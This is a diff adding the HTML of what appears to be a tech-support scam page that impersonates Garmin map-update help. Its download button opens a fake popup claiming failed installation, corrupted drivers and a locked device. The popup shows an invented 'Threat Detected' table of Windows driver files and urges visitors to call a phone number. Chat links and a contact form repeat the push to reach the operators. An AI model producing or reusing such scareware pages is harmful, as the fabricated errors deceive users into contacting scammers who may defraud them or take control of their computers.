@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="style.css" />
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"
+    />
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <script src="https://cdn.lordicon.com//libs/frhvbuzj/lord-icon-2.0.2.js"></script>
+
+    <script type="text/javascript" src="jquery.js"></script>
+<script type="text/javascript" src="popup_effect.js"></script>
+<link rel="stylesheet" href="popup_style.css">
+
+    <title>GarminPoints</title>
+  </head>
+  <body>
+    
+    <nav class="navbar">
+      <div class="max-width">
+        <div class="logo">
+          <a href="#home">Garmin <span>Help</span></a>
+        </div>
+        <ul class="menu">
+          <li><a href="#home"> Home</a></li>
+          <li><a href="#about">About</a></li>
+          <li><a href="#contact">Contact us</a></li>
+          <li><a href="#services">Services</a></li>
+        </ul>
+        <div class="menu-btn">
+          <i class="fas fa-bars"></i>
+        </div>
+      </div>
+    </nav>
+    <!-- popup -->
+    <center>
+      <div id="popup_box">
+       <input type="button" id="cancel_button" value="X">
+       <p id="info_text">
+         <div class="dabba">
+           <div class="lal-dabba">Installation Failed! <=> Error Code: R0740E <br>
+            Drivers Corrupted. An Error has Occurred While Updating Maps...</div>
+           <div class="chhota-dabba">
+             <h3 class="pehli-line">Garmin Device is Temporarily Locked. In Order to Update Your Device Call on <h2 style="color:rgb(167, 0, 0)"><a href="tel:+1-805-237-5825">+1-805-237-5825</a></h2>  (US/CA)</h3>
+             <table width="100%">
+
+              <tbody><tr>
+
+                <th>&nbsp;</th>
+
+                <th><strong>Threat Detected</strong></th>
+
+                <th><strong>Address</strong></th>
+
+                <th><strong>Threat Type</strong></th>
+
+                <th><strong>Description</strong></th>
+
+
+
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td>ftdisk.sys</td>
+
+                <td><span style="color:#b72c2c;"><strong>0XBFFBB0000</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Device Driver</a></td>
+
+                <td>FT Disk Driver</td>
+
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td>Gernuwa.sys</td>
+
+                <td><span style="color:#b72c2c;"><strong>0XED418000</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Device Driver</a></td>
+
+                <td> pcAnywhere AWURNEG Driver</td>
+
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td> hal.dll</td>
+
+                <td><span style="color:#b72c2c;"><strong> 0X8006200</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Dynamic Link</a></td>
+
+                <td> Librar Hardware Abstraction DLL</td>
+
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td> i8042prt.sys</td>
+
+                <td><span style="color:#b72c2c;"><strong> 0XED060000</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Device Driver</a></td>
+
+                <td> i8042 Port Driver</td>
+
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td> ipnet.sys</td>
+
+                <td><span style="color:#b72c2c;"><strong> 0XB524F000</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Network Driver</a></td>
+
+                <td> Navigation Translator</td>
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td> ipsec.sys</td>
+
+                <td><span style="color:#b72c2c;"><strong> 0XB52B0000</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Navigation Driver</a></td>
+
+                <td> GPS ipSec Driver</td>
+
+              </tr>
+
+              <tr>
+
+                <td><img src="images/error.gif" style="width:19px;"></td>
+
+                <td> isapnp.sys</td>
+
+                <td><span style="color:#b72c2c;"><strong> 0XED010000</strong></span></td>
+
+                <td><a href="javascript:document.void();" style="color: #0000ff; text-decoration: underline;">Dynamic Library</a></td>
+
+                <td> PNP Bus Driver</td>
+
+              </tr>
+            </tbody></table>
+           </div>
+         </div>
+       </p><input type="button" id="close_button" value="Close">
+      </div>
+     </center>
+
+    <!-- 1st upper page -->
+
+   <!-- <div class="spacer"></div> -->
+    <div id="services" class="blocks1-part part-1">
+      <div class="blocks1-part__container">
+        <div
+          class="block"
+          data-aos="fade-up"
+          data-aos-delay="30"
+          data-aos-offset="120"
+        >
+          <div class="block__image-container">
+            <div class="block__image-container__background">
+              <img
+                class="rotate"
+                src="./images/garmin_updates.png"
+                alt="Update"
+                loading="lazy"
+              />
+            </div>
+          </div>
+          <div class="block__text-container">
+            <h2>Garmin Updates</h2>
+            <p>
+              Just describe your problem in front of our experts and forget
+              everything else.
+            </p>
+          </div>
+        </div>
+
+        <div
+          class="block"
+          data-aos="fade-up"
+          data-aos-delay="100"
+          data-aos-offset="120"
+        >
+          <div class="block__image-container">
+            <div class="block__image-container__background">
+              <lord-icon
+                class="settings"
+                src="https://cdn.lordicon.com/sbiheqdr.json"
+                trigger="loop"
+                colors="primary:#121331,secondary:#08a88a"
+                stroke="50"
+              >
+              </lord-icon>
+            </div>
+          </div>
+          <div class="block__text-container">
+            <h2>Garmin Nuvi Updates</h2>
+            <p>Garmin Nuvi updates fixes are now available.</p>
+          </div>
+        </div>
+
+        <div
+          class="block"
+          data-aos="fade-up"
+          data-aos-delay="200"
+          data-aos-offset="120"
+        >
+          <div class="block__image-container">
+            <div class="block__image-container__background">
+              <lord-icon
+                src="https://cdn.lordicon.com/zzcjjxew.json"
+                trigger="loop"
+                colors="primary:#121331,secondary:#08a88a"
+              >
+              </lord-icon>
+            </div>
+          </div>
+          <div class="block__text-container">
+            <h2>GPS Map Updates</h2>
+            <p>
+              Need any help regarding garmin map update, we are here to help.
+              Our professionals can handle this in matter of minutes.Just chat
+              with live representatives.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="home" class="single-page-wrap">
+      <img
+        src="./images/2b8249afe31999e5f5d22454c920c6d3.jpg"
+        alt=""
+        class="attachment-large"
+      
+      />
+      <div class="btn-div">
+        <div class="live btn-4-download">
+          <input  type="button"  value = "Download Now" id="display_popup"
+            ></input>
+          
+        </div>
+
+       
+      </div>
+    </div>
+    <!-- block-part -->
+    <div id="services" class="blocks-part">
+      <div class="blocks-part__container">
+        <div
+          class="block"
+          data-aos="fade-up"
+          data-aos-delay="30"
+          data-aos-offset="120"
+        >
+          <div class="block__image-container">
+            <div class="block__image-container__background">
+              <img
+                class="rotate"
+                src="./images/garmin_updates.png"
+                alt="Update"
+                loading="lazy"
+              />
+            </div>
+          </div>
+          <div class="block__text-container">
+            <h2>Garmin Updates</h2>
+            <p>
+              Just describe your problem in front of our experts and forget
+              everything else.
+            </p>
+          </div>
+        </div>
+
+        <div
+          class="block"
+          data-aos="fade-up"
+          data-aos-delay="100"
+          data-aos-offset="120"
+        >
+          <div class="block__image-container">
+            <div class="block__image-container__background">
+              <lord-icon
+                class="settings"
+                src="https://cdn.lordicon.com/sbiheqdr.json"
+                trigger="loop"
+                colors="primary:#121331,secondary:#08a88a"
+                stroke="50"
+              >
+              </lord-icon>
+            </div>
+          </div>
+          <div class="block__text-container">
+            <h2>Garmin Nuvi Updates</h2>
+            <p>Garmin Nuvi updates fixes are now available.</p>
+          </div>
+        </div>
+
+        <div
+          class="block"
+          data-aos="fade-up"
+          data-aos-delay="200"
+          data-aos-offset="120"
+        >
+          <div class="block__image-container">
+            <div class="block__image-container__background">
+              <lord-icon
+                src="https://cdn.lordicon.com/zzcjjxew.json"
+                trigger="loop"
+                colors="primary:#121331,secondary:#08a88a"
+              >
+              </lord-icon>
+            </div>
+          </div>
+          <div class="block__text-container">
+            <h2>GPS Map Updates</h2>
+            <p>
+              Need any help regarding garmin map update, we are here to help.
+              Our professionals can handle this in matter of minutes.Just chat
+              with live representatives.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- white-picture-part -->
+    <div class="white-picture-part">
+      <div class="white-picture-part__image" data-aos="fade-right">
+        <img src="./images/sports-croped.jpg" alt="" loading="lazy" />
+      </div>
+      <div class="white-picture-part__text" data-aos="fade-left">
+        <h1>Sports</h1>
+        <p>
+          Chat with our experts , they will fix your issue and guide you how to
+          update your Garmin Device.
+        </p>
+        <div class="live">
+          <a href="https://tawk.to/chat/60a93aebbbd5354c0fdb8a0a/1f6agsatu"
+            >Chat with us</a
+          >
+        </div>
+      </div>
+    </div>
+    <!--GCM Devices Part -->
+    <div class="GCM-Devices-part">
+      <div class="GCM-Devices-part__text" data-aos="fade-right">
+        <h1>How to update your Garmin Device</h1>
+        <p>
+          Chat with our experts , they will fix your issue and guide you how to
+          update your Garmin Device.
+        </p>
+        <div class="live">
+          <a href="https://tawk.to/chat/60a93aebbbd5354c0fdb8a0a/1f6agsatu"
+            >Chat Now</a
+          >
+        </div>
+      </div>
+      <div class="GCM-Devices-part__image" data-aos="fade-left">
+        <img src="./images/wearables_homepage-lg.png" alt="" loading="lazy" />
+      </div>
+    </div>
+
+    <!-- black-picture-part -->
+    <div class="black-picture-part">
+      <div class="black-picture-part__image" data-aos="fade-right">
+        <img src="./images/segments-marine.jpg" alt="" loading="lazy" />
+      </div>
+      <div class="black-picture-part__text" data-aos="fade-up">
+        <h1>MARINE</h1>
+        <p>
+          Find easy-to-understand, simple-to-use, and dependable electronics for
+          your time on the water.
+        </p>
+        <div class="live-black-wala">
+          <a
+            href="https://tawk.to/chat/60a93aebbbd5354c0fdb8a0a/1f6agsatu"
+            target="_blank "
+            >Talk to Our Team</a
+          >
+        </div>
+      </div>
+    </div>
+
+    <!-- Pair SEction -->
+    <div class="pair-part">
+      <div class="pair-image">
+        <img src="./images/Pairer-repaired.jpg" alt="" loading="lazy" />
+      </div>
+    </div>
+
+    <!-- heading in black background -->
+
+    <div class="black-part">
+      <div class="black-part__text">
+        Chat with Us , we will fix your all problems , will upgrade your Garmin
+        devices.
+      </div>
+    </div>
+
+    <!-- contact section  -->
+    <section class="contact" id="contact">
+      <div class="max-width">
+        <h2 class="title">Contact Us</h2>
+        <div class="contact-content">
+          <div class="column left">
+            <div class="text">Get in Touch</div>
+
+            <div class="icons">
+              <div class="row">
+                <i class="fas fa-user"></i>
+                <div class="info">
+                  <div class="head">Name</div>
+                  <div class="sub-title">Adam Tripple</div>
+                </div>
+              </div>
+
+              <div class="row">
+                <i class="fas fa-map-marker-alt"></i>
+                <div class="info">
+                  <div class="head">Address</div>
+                  <div class="sub-title">
+                    <a href=" " target="_blank">California</a>
+                  </div>
+                </div>
+              </div>
+
+              <div class="row">
+                <i class="fas fa-envelope"></i>
+                <div class="info">
+                  <div class="head">Phone</div>
+                  <div class="sub-title">
+                    <a href="tel:+1-805-237-5825" target="_blank"
+                      >+1-805-237-5825</a
+                    >
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="column right">
+            <div class="text">Message us</div>
+            <form
+              id="my-form"
+              class="contact-form"
+              action="https://formspree.io/f/mnqlqyzv"
+              method="POST"
+            >
+              <div class="fields">
+                <div class="field name">
+                  <input
+                    name="fullname"
+                    type="text"
+                    class="fullname"
+                    placeholder="Name"
+                  />
+                </div>
+                <div class="field email">
+                  <input
+                    name="email"
+                    type="text"
+                    class="email-input"
+                    placeholder="Email"
+                  />
+                </div>
+              </div>
+
+              <div class="field textarea">
+                <textarea
+                  name="textarea"
+                  class="message"
+                  cols="30"
+                  rows="10"
+                  placeholder="Any message for me..."
+                ></textarea>
+              </div>
+              <div class="button area">
+                <button class="send-msg" type="submit" name="send">
+                  Send Message
+                </button>
+              </div>
+            </form>
+            <div id="status"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- location-section -->
+    <div id="googleMap" class="map-part">
+      <iframe
+        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d6509167.153936251!2d-123.79957983194143!3d37.19300171806629!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x808fb9fe5f285e3d%3A0x8b5109a227086f55!2sCalifornia%2C%20USA!5e0!3m2!1sen!2s!4v1621843730547!5m2!1sen!2s"
+        width="1086"
+        height="500"
+        style="border: 0"
+        allowfullscreen=""
+        loading="lazy"
+      ></iframe>
+    </div>
+
+    <script src="script.js"></script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/60a93aebbbd5354c0fdb8a0a/1f6agsatu';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+    <script>
+      AOS.init({
+        offset: 200,
+        duration: 800,
+      });
+    </script>
+  </body>
+</html>
